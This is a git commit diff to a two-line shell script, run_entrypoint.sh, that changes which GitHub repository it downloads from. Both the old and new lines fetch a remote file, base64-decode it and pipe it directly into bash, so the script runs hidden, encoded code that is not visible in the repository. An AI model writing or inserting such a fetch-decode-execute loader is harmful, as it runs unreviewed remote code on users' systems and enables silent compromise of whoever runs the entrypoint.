acccc46499ed2fd04acac0154902cccad31ee5cf
garykaggle3 <garykaggle@proton.me>
2026-06-10 19:42:34 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/russellcoaxum/plate/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/garykaggle3/plugged/refs/heads/main/entrypoint.sh | base64 -d | bash
